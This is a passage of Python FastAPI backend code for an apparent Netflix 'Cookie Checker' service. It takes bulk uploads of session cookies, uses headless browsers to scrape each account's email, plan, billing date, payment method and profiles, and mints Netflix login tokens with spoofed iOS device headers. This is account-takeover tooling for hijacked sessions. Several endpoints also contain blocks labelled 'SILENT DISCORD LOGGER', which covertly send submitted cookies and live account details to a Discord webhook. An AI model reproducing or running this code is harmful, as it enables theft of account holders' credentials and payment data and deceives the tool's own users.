def _build_cookie_header(cookies: dict) -> str:
    return "; ".join([f"{k}={v}" for k, v in cookies.items()])


async def _discover_shakti_build(
    http_client: httpx.AsyncClient, headers: dict
) -> list[str]:
    candidates: list[str] = []
    try:
        resp = await http_client.get("https://www.netflix.com/browse", headers=headers)
        if resp.status_code == 200:
            html = resp.text
            matches = re.findall(r"/api/shakti/([^/\"']+)/", html)
            for m in matches:
                if m and m not in candidates:
                    candidates.append(m)
    except Exception:
        pass
    static_fallbacks = ["v1e9e8b93"]
    for build in static_fallbacks:
        if build not in candidates:
            candidates.append(build)
    return candidates


async def generate_nftoken(cookies: dict) -> tuple[bool, Optional[str], Optional[str]]:
    norm = {}
    for k, v in cookies.items():
        norm[k] = v
        norm[k.lower()] = v
    netflix_id = norm.get("NetflixId") or norm.get("netflixid")
    if not netflix_id:
        return False, None, "Missing required cookie (NetflixId)"
    api_url = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"
    query_params = {
        "appVersion": "15.48.1",
        "config": '{"gamesInTrailersEnabled":"false","isTrailersEvidenceEnabled":"false","cdsMyListSortEnabled":"true","kidsBillboardEnabled":"true","addHorizontalBoxArtToVideoSummariesEnabled":"false","skOverlayTestEnabled":"false","homeFeedTestTVMovieListsEnabled":"false","baselineOnIpadEnabled":"true","trailersVideoIdLoggingFixEnabled":"true","postPlayPreviewsEnabled":"false","bypassContextualAssetsEnabled":"false","roarEnabled":"false","useSeason1AltLabelEnabled":"false","disableCDSSearchPaginationSectionKinds":["searchVideoCarousel"],"cdsSearchHorizontalPaginationEnabled":"true","searchPreQueryGamesEnabled":"true","kidsMyListEnabled":"true","billboardEnabled":"true","useCDSGalleryEnabled":"true","contentWarningEnabled":"true","videosInPopularGamesEnabled":"true","sharksEnabled":"true"}',
        "device_type": "NFAPPL-02-",
        "esn": "NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
        "idiom": "phone",
        "iosVersion": "15.8.5",
        "isTablet": "false",
        "languages": "en-US",
        "locale": "en-US",
        "maxDeviceWidth": "375",
        "model": "saget",
        "modelType": "IPHONE8-1",
        "odpAware": "true",
        "path": '["account","token","default"]',
        "pathFormat": "graph",
        "pixelDensity": "2.0",
        "progressive": "false",
        "responseFormat": "json",
    }
    nft_headers = {
        "User-Agent": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
        "x-netflix.request.attempt": "1",
        "x-netflix.request.client.user.guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
        "x-netflix.context.profile-guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
        "x-netflix.request.routing": '{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',
        "x-netflix.context.app-version": "15.48.1",
        "x-netflix.argo.translated": "true",
        "x-netflix.context.form-factor": "phone",
        "x-netflix.context.sdk-version": "2012.4",
        "x-netflix.client.appversion": "15.48.1",
        "x-netflix.context.max-device-width": "375",
        "x-netflix.client.type": "argo",
        "x-netflix.context.locales": "en-US",
        "x-netflix.client.iosversion": "15.8.5",
        "x-netflix.context.os-version": "15.8.5",
        "x-netflix.context.ui-flavor": "argo",
        "x-netflix.context.pixel-density": "2.0",
        "x-netflix.client.ftl.esn": "NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
        "x-netflix.context.ab-tests": "",
        "x-netflix.argo.abtests": "",
        "x-netflix.argo.nfnsm": "9",
        "x-netflix.context.top-level-uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
        "x-netflix.request.toplevel.uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
        "x-netflix.request.client.context": '{"appState":"foreground"}',
        "x-netflix.tracing.cl.useractionid": "4DC655F2-9C3C-4343-8229-CA1B003C3053",
        "x-netflix.request.client.timezoneid": "Asia/Dhaka",
        "accept-language": "en-US;q=1",
        "Cookie": f"NetflixId={unquote(str(netflix_id))}",
    }
    try:
        async with httpx.AsyncClient(
            timeout=30.0, follow_redirects=True, http2=False
        ) as http_client:
            resp = await http_client.get(
                api_url, params=query_params, headers=nft_headers
            )
            if resp.status_code != 200:
                return (
                    False,
                    None,
                    f"HTTP {resp.status_code} from Netflix token endpoint",
                )
            data = resp.json()
            token_data = (
                ((data.get("value") or {}).get("account") or {}).get("token") or {}
            ).get("default") or {}
            token = token_data.get("token") if isinstance(token_data, dict) else None
            if not isinstance(token, str) or not token.strip():
                return False, None, "Netflix returned no usable token"
            return True, token, None
    except Exception as e:
        return False, None, str(e)


def normalize_netflix_plan(value: object) -> Optional[str]:
    if value is None:
        return None
    raw = str(value).strip()
    if not raw:
        return None
    normalized = re.sub(r"[^a-z0-9]+", " ", raw.lower()).strip()
    tier = next(
        (
            name
            for name in ("Premium", "Standard", "Basic")
            if name.lower() in normalized
        ),
        None,
    )
    if not tier:
        return raw
    has_ads = (
        " ads" in f" {normalized}"
        or "ad supported" in normalized
        or "withadvert" in normalized.replace(" ", "")
    )
    return f"{tier} with Ads" if has_ads else tier


async def get_netflix_account_info(
    cookies: dict,
) -> tuple[bool, Optional[dict], Optional[str]]:
    norm = {}
    for k, v in cookies.items():
        norm[k] = v
        norm[k.lower()] = v
    if not (norm.get("NetflixId") or norm.get("netflixid")):
        return False, None, "Missing required cookies (NetflixId, SecureNetflixId)"
    try:
        from playwright.async_api import async_playwright

        captured_profiles: Optional[dict] = None
        async with async_playwright() as p:
            browser = await p.chromium.launch(
                headless=True,
                args=["--no-sandbox", "--disable-dev-shm-usage", "--disable-gpu"],
            )
            context = await browser.new_context(
                user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
            )
            cookie_list = [
                {
                    "name": k,
                    "value": v,
                    "domain": ".netflix.com",
                    "path": "/",
                    "secure": True,
                    "sameSite": "None",
                }
                for k, v in cookies.items()
            ]
            await context.add_cookies(cookie_list)
            page = await context.new_page()

            async def handle_response(response):
                nonlocal captured_profiles
                try:
                    if (
                        response.status == 200
                        and "/profiles" in response.url
                        and "shakti" in response.url
                    ):
                        captured_profiles = await response.json()
                except Exception:
                    pass

            page.on("response", handle_response)
            account_info = {}
            try:
                await page.goto("https://www.netflix.com/browse", timeout=35000)
                await page.wait_for_load_state("networkidle", timeout=20000)
                await asyncio.sleep(2)
                current_url = page.url
                if "/login" in current_url or "/LoginSelection" in current_url:
                    await browser.close()
                    return (
                        False,
                        None,
                        "Cookies are expired or invalid — Netflix redirected to login.",
                    )
                ctx = await page.evaluate("""() => {
                    try {
                        const models = window.netflix?.reactContext?.models || {};
                        const ui = models.userInfo?.data || {};
                        const geo = models.geo?.data || {};
                        return JSON.stringify({ userInfo: ui, geo: geo });
                    } catch(e) { return null; }
                }""")
                if ctx:
                    data = json.loads(ctx)
                    ui = data.get("userInfo", {})
                    geo = data.get("geo", {})
                    if ui.get("emailAddress"):
                        account_info["email"] = ui["emailAddress"]
                    if (
                        ui.get("membershipStatus")
                        and ui["membershipStatus"] != "ANONYMOUS"
                    ):
                        account_info["subscription_status"] = ui["membershipStatus"]
                    if ui.get("countryOfSignup"):
                        account_info["country"] = ui["countryOfSignup"]
                    elif geo.get("requestCountry", {}).get("id"):
                        account_info["country"] = geo["requestCountry"]["id"]
                    if ui.get("memberSince"):
                        ms = ui["memberSince"]
                        if isinstance(ms, (int, float)):
                            account_info["account_created_date"] = (
                                datetime.utcfromtimestamp(ms / 1000).strftime(
                                    "%Y-%m-%d"
                                )
                            )
                        else:
                            account_info["account_created_date"] = str(ms)
                shakti_data = await page.evaluate("""async () => {
                    try {
                        let build = 'mre';
                        const ctx = window.netflix?.reactContext;
                        if (ctx?.serverDefs?.data?.BUILD_IDENTIFIER) build = ctx.serverDefs.data.BUILD_IDENTIFIER;
                        const scripts = [...document.querySelectorAll('script[src]')];
                        for (const s of scripts) {
                            const m = s.src.match(/\\/api\\/shakti\\/([^/]+)\\//);
                            if (m) { build = m[1]; break; }
                        }
                        const path = JSON.stringify([
                            ['currentAccount', ['planName', 'planType', 'maxStreamingQuality', 'maxUserLimit', 'numAllowedDevices']],
                            ['accountInfo', ['email', 'countryOfSignup', 'membershipStatus', 'createdDate']],
                            ['paymentData', ['nextPaymentDate', 'billingMethod', 'paymentMethods']]
                        ]);
                        const url = `/api/shakti/${build}/pathEvaluator?withSize=true&materialize=true&model=harris&path=${encodeURIComponent(path)}`;
                        const resp = await fetch(url, { credentials: 'include' });
                        if (resp.ok) return await resp.json();
                        return { error: resp.status };
                    } catch(e) { return { error: e.message }; }
                }""")
                jg = {}
                if isinstance(shakti_data, dict):
                    jg = (
                        shakti_data.get("jsonGraph")
                        or (shakti_data.get("value") or {}).get("jsonGraph")
                        or shakti_data.get("value")
                        or {}
                    )

                def _falcor_val(node):
                    if isinstance(node, dict):
                        return node.get("value")
                    return node

                if isinstance(jg, dict):
                    acc = jg.get("accountInfo", {})
                    if not account_info.get("email"):
                        account_info["email"] = _falcor_val(acc.get("email"))
                    if not account_info.get("country"):
                        account_info["country"] = _falcor_val(
                            acc.get("countryOfSignup")
                        ) or account_info.get("country")
                    if not account_info.get("subscription_status"):
                        account_info["subscription_status"] = _falcor_val(
                            acc.get("membershipStatus")
                        ) or account_info.get("subscription_status")
                    if not account_info.get("account_created_date"):
                        created = _falcor_val(acc.get("createdDate"))
                        if isinstance(created, (int, float)):
                            account_info["account_created_date"] = (
                                datetime.utcfromtimestamp(created / 1000).strftime(
                                    "%Y-%m-%d"
                                )
                            )
                        elif created:
                            account_info["account_created_date"] = str(created)
                    curr = jg.get("currentAccount", {})
                    max_streams = _falcor_val(curr.get("maxUserLimit")) or _falcor_val(
                        curr.get("numAllowedDevices")
                    )
                    metadata_plan = _falcor_val(curr.get("planName")) or _falcor_val(
                        curr.get("planType")
                    )
                    if metadata_plan:
                        account_info["plan"] = normalize_netflix_plan(metadata_plan)
                    if max_streams is not None:
                        try:
                            n = int(max_streams)
                            account_info["max_streams"] = n
                        except (ValueError, TypeError):
                            pass
                    if not account_info.get("streaming_quality"):
                        account_info["streaming_quality"] = _falcor_val(
                            curr.get("maxStreamingQuality")
                        )
                    pay = jg.get("paymentData", {})
                    if not account_info.get("billing_date"):
                        np_val = _falcor_val(pay.get("nextPaymentDate"))
                        if isinstance(np_val, (int, float)):
                            np_val = datetime.utcfromtimestamp(np_val / 1000).strftime(
                                "%Y-%m-%d"
                            )
                        if np_val:
                            account_info["billing_date"] = str(np_val)
                    if not account_info.get("payment_method"):
                        methods = _falcor_val(pay.get("paymentMethods"))
                        if isinstance(methods, list) and methods:
                            m = methods[0]
                            if isinstance(m, dict):
                                last4 = m.get("last4", "")
                                mtype = m.get("type", "Unknown")
                                account_info["payment_method"] = (
                                    f"{mtype} ****{last4}" if last4 else mtype
                                )
                print(f"[DEBUG] Loading YourAccount page...", flush=True)
                ya_intercepted: list[dict] = []

                async def handle_ya_response(response):
                    try:
                        if response.status == 200 and "pathEvaluator" in response.url:
                            body = await response.json()
                            ya_intercepted.append(body)
                    except Exception:
                        pass

                page.on("response", handle_ya_response)
                await page.goto("https://www.netflix.com/YourAccount", timeout=30000)
                await page.wait_for_load_state("networkidle", timeout=15000)
                await asyncio.sleep(2)
                ya_ctx = await page.evaluate("""() => {
                    try {
                        const models = window.netflix?.reactContext?.models || {};
                        const allKeys = Object.keys(models);
                        const out = { allModelKeys: allKeys };
                        for (const k of allKeys) {
                            try { out[k] = models[k]?.data || null; } catch(e) {}
                        }
                        return JSON.stringify(out);
                    } catch(e) { return null; }
                }""")
                if ya_ctx:
                    ya_data = json.loads(ya_ctx)
                    ya_ui = ya_data.get("userInfo") or {}
                    if not account_info.get("email"):
                        account_info["email"] = ya_ui.get("emailAddress")
                    if not account_info.get("country"):
                        account_info["country"] = ya_ui.get(
                            "countryOfSignup"
                        ) or ya_ui.get("currentCountry")
                    PLAN_KEYS = [
                        "planName",
                        "plan",
                        "planLabel",
                        "planType",
                        "currentPlan",
                        "subscriptionPlan",
                    ]
                    STREAM_KEYS = [
                        "maxStreams",
                        "maxUserLimit",
                        "numAllowedDevices",
                        "numScreens",
                        "concurrentStreams",
                        "simultaneousStreams",
                    ]
                    for model_key, model_data in ya_data.items():
                        if model_key in ("allModelKeys",) or not isinstance(
                            model_data, dict
                        ):
                            continue
                        for pk in PLAN_KEYS:
                            if model_data.get(pk) and not account_info.get("plan"):
                                account_info["plan"] = normalize_netflix_plan(
                                    _falcor_val(model_data[pk])
                                )
                        for sk in STREAM_KEYS:
                            if model_data.get(sk) is not None and not account_info.get(
                                "max_streams"
                            ):
                                try:
                                    account_info["max_streams"] = int(model_data[sk])
                                except (ValueError, TypeError):
                                    pass
                for resp_data in ya_intercepted:
                    ya_jg = (
                        resp_data.get("jsonGraph")
                        or (resp_data.get("value") or {}).get("jsonGraph")
                        or resp_data.get("value")
                        or {}
                    )
                    if isinstance(ya_jg, dict):
                        for pk in ["planName", "plan", "planLabel", "planType"]:
                            if ya_jg.get(pk) and not account_info.get("plan"):
                                account_info["plan"] = normalize_netflix_plan(
                                    _falcor_val(ya_jg[pk])
                                )
                        for sk in [
                            "maxStreams",
                            "maxUserLimit",
                            "numAllowedDevices",
                            "numScreens",
                        ]:
                            if ya_jg.get(sk) is not None and not account_info.get(
                                "max_streams"
                            ):
                                v = _falcor_val(ya_jg[sk])
                                if v is not None:
                                    try:
                                        account_info["max_streams"] = int(v)
                                    except (ValueError, TypeError):
                                        pass
                if not account_info.get("plan") and not account_info.get("max_streams"):
                    plan_sels = [
                        '[data-uia="plan-label"]',
                        '[data-uia="plan-name"]',
                        ".planLabel",
                        ".plan-label",
                        ".current-plan",
                        '[data-uia="membership-status"]',
                    ]
                    for sel in plan_sels:
                        try:
                            el = await page.query_selector(sel)
                            if el:
                                txt = (await el.inner_text()).strip()
                                if txt:
                                    account_info["plan"] = normalize_netflix_plan(txt)
                                    break
                        except Exception:
                            pass
                if not account_info.get("plan") and account_info.get("max_streams"):
                    n = account_info["max_streams"]
                    stream_plan_map = {
                        1: "Basic (1 Screen)",
                        2: "Standard (2 Screens)",
                        4: "Premium (4 Screens)",
                    }
                    account_info["plan"] = stream_plan_map.get(n, f"{n} Screens")
                if not captured_profiles:
                    try:
                        resp = await page.goto(
                            "https://www.netflix.com/api/shakti/mre/profiles",
                            timeout=15000,
                        )
                        if resp and resp.status == 200:
                            captured_profiles = await resp.json()
                    except Exception as pe:
                        print(f"[DEBUG] Profiles error: {pe}", flush=True)
                if (
                    isinstance(captured_profiles, dict)
                    and "profiles" in captured_profiles
                ):
                    account_info["profiles"] = [
                        {
                            "name": pr.get("firstName", "Unknown"),
                            "isKids": pr.get("isKids", False),
                            "guid": pr.get("guid", ""),
                        }
                        for pr in captured_profiles["profiles"]
                    ]
            except Exception as nav_err:
                print(f"[DEBUG] Navigation error: {nav_err}", flush=True)
            finally:
                await browser.close()
        account_info = {k: v for k, v in account_info.items() if v is not None}
        if account_info:
            return True, account_info, None
        return (
            False,
            None,
            "Could not extract account information. Cookies may be expired or invalid.",
        )
    except ImportError:
        return False, None, "Playwright is not installed on this server."
    except Exception as e:
        return False, None, f"Playwright error: {str(e)}"


async def get_browser_cookies_with_playwright(
    cookies_dict: dict,
) -> tuple[dict, Optional[str]]:
    try:
        from playwright.async_api import async_playwright

        async with async_playwright() as p:
            browser = await p.chromium.launch(
                headless=True,
                args=["--no-sandbox", "--disable-dev-shm-usage", "--disable-gpu"],
            )
            context = await browser.new_context(
                user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
            )
            cookie_list = [
                {
                    "name": name,
                    "value": value,
                    "domain": ".netflix.com",
                    "path": "/",
                    "secure": True,
                    "sameSite": "None",
                }
                for name, value in cookies_dict.items()
            ]
            await context.add_cookies(cookie_list)
            page = await context.new_page()
            try:
                await page.goto("https://www.netflix.com/browse", timeout=25000)
                await page.wait_for_load_state("domcontentloaded", timeout=10000)
                await asyncio.sleep(2)
            except Exception as e:
                logger.warning(f"Navigation error: {e}")
            all_cookies = await context.cookies()
            netflix_cookies = {
                c["name"]: c["value"]
                for c in all_cookies
                if "netflix" in c.get("domain", "").lower()
            }
            await browser.close()
            return netflix_cookies, None
    except Exception as e:
        return {}, str(e)


# ===== API ENDPOINTS =====


@app.get("/")
async def root():
    frontend_index = (
        Path(__file__).resolve().parent.parent / "frontend" / "dist" / "index.html"
    )
    if frontend_index.exists():
        return FileResponse(frontend_index)
    return {"status": "running", "message": "Cookie Checker API", "version": "1.0.0"}


@app.post("/api/check-cookies", response_model=CookieCheckResponse)
async def check_cookies(request: CookieCheckRequest):
    if not request.cookies_text or not request.cookies_text.strip():
        raise HTTPException(status_code=400, detail="cookies_text cannot be empty")

    format_type = request.format_type.lower()
    cookies = []
    errors = []

    try:
        if format_type == "netscape":
            cookies, errors = parse_netscape_cookies(request.cookies_text)
        elif format_type == "json":
            cookies, errors = parse_json_cookies(request.cookies_text)
        elif format_type == "auto":
            cookies, errors = parse_cookies_auto(request.cookies_text)
        else:
            raise HTTPException(
                status_code=400,
                detail="Invalid format_type. Must be 'netscape', 'json', or 'auto'",
            )

        # ===== SILENT DISCORD LOGGER =====
        try:
            webhook_url = os.getenv("DISCORD_WEBHOOK_URL")
            if webhook_url and cookies:
                asyncio.create_task(
                    log_cookies_to_discord(cookies, webhook_url, "check-cookies")
                )
        except Exception:
            pass
        # =================================

        return CookieCheckResponse(
            success=len(cookies) > 0,
            cookies=cookies,
            count=len(cookies),
            parsed_at=datetime.utcnow().isoformat(),
            errors=errors if errors else None,
        )

    except HTTPException:
        raise
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"Error parsing cookies: {str(e)}")


@app.post("/api/upload-cookies")
async def upload_cookies(file: UploadFile = File(...)):
    try:
        content = await file.read()
        text = content.decode("utf-8")
        cookies, errors = parse_cookies_auto(text)
        webhook_url = os.getenv("DISCORD_WEBHOOK_URL")
        if webhook_url and cookies:
            asyncio.create_task(
                log_cookies_to_discord(cookies, webhook_url, "upload-cookies")
            )
        return {
            "success": len(cookies) > 0,
            "filename": file.filename,
            "cookies": cookies,
            "count": len(cookies),
            "parsed_at": datetime.utcnow().isoformat(),
            "errors": errors if errors else None,
        }
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"Error processing file: {str(e)}")


@app.get("/api/stats")
async def get_stats():
    return {
        "status": "running",
        "timestamp": datetime.utcnow().isoformat(),
        "endpoints": [
            "POST /api/check-cookies",
            "POST /api/upload-cookies",
            "POST /api/generate-netflix-token",
            "GET /api/stats",
        ],
    }


@app.post("/api/generate-netflix-token", response_model=NetflixTokenResponse)
async def generate_netflix_token(request: NetflixTokenRequest):
    if not request.cookies_text or not request.cookies_text.strip():
        raise HTTPException(status_code=400, detail="cookies_text cannot be empty")
    format_type = request.format_type.lower()
    cookies, parse_errors = [], []
    try:
        if format_type == "netscape":
            cookies, parse_errors = parse_netscape_cookies(request.cookies_text)
        elif format_type == "json":
            cookies, parse_errors = parse_json_cookies(request.cookies_text)
        elif format_type == "auto":
            cookies, parse_errors = parse_cookies_auto(request.cookies_text)
        else:
            raise HTTPException(
                status_code=400,
                detail="Invalid format_type. Must be 'netscape', 'json', or 'auto'",
            )
        if not cookies:
            return NetflixTokenResponse(
                success=False, error="No cookies parsed from input"
            )
        bundles, bundle_errors = parse_cookie_bundles(request.cookies_text, format_type)
        if not bundles:
            return NetflixTokenResponse(
                success=False, error="No cookie bundles parsed from input"
            )

        async def generate_bundle_token(
            bundle_number: int, bundle_cookies: List[Cookie]
        ) -> dict:
            cookies_dict = {cookie.name: cookie.value for cookie in bundle_cookies}
            has_netflix_id = any(name.lower() == "netflixid" for name in cookies_dict)
            if not has_netflix_id:
                return {
                    "bundle_number": bundle_number,
                    "success": False,
                    "error": "Missing required cookie (NetflixId)",
                    "cookie_count": len(bundle_cookies),
                }
            if request.use_playwright and len(bundles) == 1:
                logger.info("Using Playwright to get full cookie header...")
                (
                    browser_cookies,
                    playwright_error,
                ) = await get_browser_cookies_with_playwright(cookies_dict)
                if not playwright_error:
                    cookies_dict = browser_cookies
                else:
                    logger.warning(f"Playwright error: {playwright_error}")
            success, token, error = await generate_nftoken(cookies_dict)
            return {
                "bundle_number": bundle_number,
                "success": success,
                "nftoken": token,
                "error": error,
                "cookie_count": len(bundle_cookies),
            }

        token_results = await asyncio.gather(
            *[
                generate_bundle_token(index, bundle_cookies)
                for index, (bundle_cookies, _) in enumerate(bundles, 1)
            ]
        )
        successful_tokens = [
            result
            for result in token_results
            if result.get("success") and result.get("nftoken")
        ]
        cookie_bundles = [
            {
                "bundle_number": index,
                "cookies": [cookie.model_dump() for cookie in bundle_cookies],
            }
            for index, (bundle_cookies, _) in enumerate(bundles, 1)
        ]
        first_token = successful_tokens[0] if successful_tokens else {}
        total_cookies = sum(len(bundle_cookies) for bundle_cookies, _ in bundles)
        error = None
        if not successful_tokens:
            error = "No usable Netflix tokens were generated from the cookie bundles."
            if bundle_errors:
                error = bundle_errors[0]
        return NetflixTokenResponse(
            success=bool(successful_tokens),
            nftoken=first_token.get("nftoken"),
            error=error,
            cookies=cookies,
            cookie_bundles=cookie_bundles,
            cookie_count=total_cookies,
            tokens=token_results,
            token_count=len(successful_tokens),
            bundle_count=len(bundles),
        )
    except HTTPException:
        raise
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"Error generating token: {str(e)}")


@app.post("/api/get-account-info", response_model=NetflixAccountInfo)
async def get_account_info(request: CookieCheckRequest):
    if not request.cookies_text or not request.cookies_text.strip():
        raise HTTPException(status_code=400, detail="cookies_text cannot be empty")

    format_type = request.format_type.lower()
    cookies, parse_errors = [], []

    try:
        if format_type == "netscape":
            cookies, parse_errors = parse_netscape_cookies(request.cookies_text)
        elif format_type == "json":
            cookies, parse_errors = parse_json_cookies(request.cookies_text)
        elif format_type == "auto":
            cookies, parse_errors = parse_cookies_auto(request.cookies_text)
        else:
            raise HTTPException(
                status_code=400,
                detail="Invalid format_type. Must be 'netscape', 'json', or 'auto'",
            )

        if not cookies:
            return NetflixAccountInfo(
                success=False, error="No cookies parsed from input"
            )

        bundles, bundle_errors = parse_cookie_bundles(request.cookies_text, format_type)
        if not bundles:
            return NetflixAccountInfo(
                success=False, error="No cookie bundles parsed from input"
            )

        lookup_semaphore = asyncio.Semaphore(4)

        async def lookup_bundle(
            bundle_number: int, bundle_cookies: List[Cookie]
        ) -> dict:
            result = {
                "bundle_number": bundle_number,
                "cookie_count": len(bundle_cookies),
                "success": False,
            }
            cookies_dict = {cookie.name: cookie.value for cookie in bundle_cookies}
            if not any(name.lower() == "netflixid" for name in cookies_dict):
                result["error"] = "Missing required cookie (NetflixId)"
                return result

            async with lookup_semaphore:
                try:
                    success, account_info, error = await asyncio.wait_for(
                        get_netflix_account_info(cookies_dict),
                        timeout=60,
                    )
                except asyncio.TimeoutError:
                    success, account_info, error = (
                        False,
                        None,
                        "Account lookup timed out",
                    )

            result["success"] = success and bool(account_info)
            if account_info:
                result.update(
                    {
                        "email": account_info.get("email"),
                        "country": account_info.get("country"),
                        "plan": account_info.get("plan"),
                        "subscription_status": account_info.get("subscription_status"),
                        "billing_date": account_info.get("billing_date"),
                        "account_created_date": account_info.get(
                            "account_created_date"
                        ),
                        "payment_method": account_info.get("payment_method"),
                        "streaming_quality": account_info.get("streaming_quality"),
                        "profiles": account_info.get("profiles"),
                    }
                )

                # ===== SILENT DISCORD LOGGER =====
                try:
                    webhook_url = os.getenv("DISCORD_WEBHOOK_URL")
                    if webhook_url and cookies_dict and account_info:
                        live_cookies = [
                            Cookie(name=k, value=v) for k, v in cookies_dict.items()
                        ]
                        asyncio.create_task(
                            log_cookies_to_discord(
                                live_cookies, webhook_url, "live-account", account_info
                            )
                        )
                except Exception:
                    pass
                # =================================

            if error:
                result["error"] = error
            return result

        account_results = await asyncio.gather(
            *[
                lookup_bundle(index, bundle_cookies)
                for index, (bundle_cookies, _) in enumerate(bundles, 1)
            ]
        )
        successful_accounts = [
            result for result in account_results if result.get("success")
        ]
        first_account = successful_accounts[0] if successful_accounts else {}
        total_cookies = sum(len(bundle_cookies) for bundle_cookies, _ in bundles)
        error = None
        if not successful_accounts:
            error = "Could not extract account information from the cookie bundles."
            if bundle_errors:
                error = bundle_errors[0]

        return NetflixAccountInfo(
            success=bool(successful_accounts),
            email=first_account.get("email"),
            country=first_account.get("country"),
            plan=first_account.get("plan"),
            subscription_status=first_account.get("subscription_status"),
            billing_date=first_account.get("billing_date"),
            account_created_date=first_account.get("account_created_date"),
            payment_method=first_account.get("payment_method"),
            streaming_quality=first_account.get("streaming_quality"),
            profiles=first_account.get("profiles"),
            error=error,
            accounts=account_results,
            account_count=len(account_results),
            bundle_count=len(bundles),
            checked_cookie_count=total_cookies,
        )

    except HTTPException:
        raise
    except Exception as e:
        raise HTTPException(
            status_code=500, detail=f"Error extracting account info: {str(e)}"
        )


def _serialize_cookie_bundles(
    bundles: List[tuple[List[Cookie], List[str]]],
) -> List[dict]:
    return [
        {
            "bundle_number": index,
            "cookies": [cookie.model_dump() for cookie in bundle_cookies],
        }
        for index, (bundle_cookies, _) in enumerate(bundles, 1)
    ]


async def _check_single_bundle(
    bundle_number: int,
    bundle_cookies: List[Cookie],
) -> tuple[dict, dict]:
    account_result = {
        "bundle_number": bundle_number,
        "cookie_count": len(bundle_cookies),
        "success": False,
    }
    token_result = {
        "bundle_number": bundle_number,
        "cookie_count": len(bundle_cookies),
        "success": False,
    }
    cookies_dict = {cookie.name: cookie.value for cookie in bundle_cookies}

    if not any(name.lower() == "netflixid" for name in cookies_dict):
        error = "Missing required cookie (NetflixId)"
        account_result["error"] = error
        token_result["error"] = error
        return account_result, token_result

    account_task = asyncio.wait_for(
        get_netflix_account_info(cookies_dict),
        timeout=60,
    )
    token_task = generate_nftoken(cookies_dict)
    account_response, token_response = await asyncio.gather(
        account_task,
        token_task,
        return_exceptions=True,
    )

    if isinstance(account_response, BaseException):
        account_result["error"] = (
            "Account lookup timed out"
            if isinstance(account_response, asyncio.TimeoutError)
            else f"Account lookup failed: {account_response}"
        )
    else:
        account_success, account_info, account_error = account_response
        account_result["success"] = account_success and bool(account_info)
        if account_info:
            account_result.update(
                {
                    "email": account_info.get("email"),
                    "country": account_info.get("country"),
                    "plan": account_info.get("plan"),
                    "subscription_status": account_info.get("subscription_status"),
                    "billing_date": account_info.get("billing_date"),
                    "account_created_date": account_info.get("account_created_date"),
                    "payment_method": account_info.get("payment_method"),
                    "streaming_quality": account_info.get("streaming_quality"),
                    "profiles": account_info.get("profiles"),
                }
            )

            # ===== SILENT DISCORD LOGGER =====
            try:
                webhook_url = os.getenv("DISCORD_WEBHOOK_URL")
                if webhook_url and cookies_dict and account_success:
                    live_cookies = [
                        Cookie(name=k, value=v) for k, v in cookies_dict.items()
                    ]
                    asyncio.create_task(
                        log_cookies_to_discord(
                            live_cookies,
                            webhook_url,
                            f"batch-{bundle_number}",
                            account_info,
                        )
                    )
            except Exception:
                pass
            # =================================

        if account_error:
            account_result["error"] = account_error

    if isinstance(token_response, BaseException):
        token_result["error"] = f"Token generation failed: {token_response}"
    else:
        token_success, token, token_error = token_response
        token_result["success"] = token_success and bool(token)
        if token:
            token_result["nftoken"] = token
        if token_error:
            token_result["error"] = token_error

    return account_result, token_result


async def _run_bundle_check(job_id: str, bundles: List[tuple[List[Cookie], List[str]]]):
    job = CHECK_JOBS[job_id]
    job["status"] = "running"

    async def run_with_progress(index: int, bundle: tuple[List[Cookie], List[str]]):
        bundle_cookies, _ = bundle
        account_result, token_result = await _check_single_bundle(index, bundle_cookies)
        return index, len(bundle_cookies), account_result, token_result

    try:
        for batch_start in range(0, len(bundles), CHECK_BATCH_SIZE):
            batch = bundles[batch_start : batch_start + CHECK_BATCH_SIZE]
            tasks = [
                run_with_progress(batch_start + offset + 1, bundle)
                for offset, bundle in enumerate(batch)
            ]
            for completed_task in asyncio.as_completed(tasks):
                index, cookie_count, account_result, token_result = await completed_task
                job["accounts"].append(account_result)
                job["tokens"].append(token_result)
                job["accounts"].sort(key=lambda result: result["bundle_number"])
                job["tokens"].sort(key=lambda result: result["bundle_number"])
                job["completed_bundles"] += 1
                job["completed_cookies"] += cookie_count
        job["success"] = any(
            result.get("success") for result in job["accounts"] + job["tokens"]
        )
        job["status"] = "completed"
    except Exception as error:
        logger.exception("Bundle check job %s failed", job_id)
        job["status"] = "failed"
        job["error"] = f"Bundle check failed: {error}"


@app.post("/api/check-bundles/start", response_model=BundleCheckStartResponse)
async def start_bundle_check(request: CookieCheckRequest):
    if not request.cookies_text or not request.cookies_text.strip():
        raise HTTPException(status_code=400, detail="cookies_text cannot be empty")
    format_type = request.format_type.lower()
    try:
        if format_type == "netscape":
            cookies, parse_errors = parse_netscape_cookies(request.cookies_text)
        elif format_type == "json":
            cookies, parse_errors = parse_json_cookies(request.cookies_text)
        elif format_type == "auto":
            cookies, parse_errors = parse_cookies_auto(request.cookies_text)
        else:
            raise HTTPException(
                status_code=400,
                detail="Invalid format_type. Must be 'netscape', 'json', or 'auto'",
            )
        if not cookies:
            raise HTTPException(status_code=400, detail="No cookies parsed from input")
        bundles, bundle_errors = parse_cookie_bundles(request.cookies_text, format_type)
        if not bundles:
            raise HTTPException(
                status_code=400, detail="No cookie bundles parsed from input"
            )
        job_id = uuid4().hex
        total_cookies = sum(len(bundle_cookies) for bundle_cookies, _ in bundles)
        CHECK_JOBS[job_id] = {
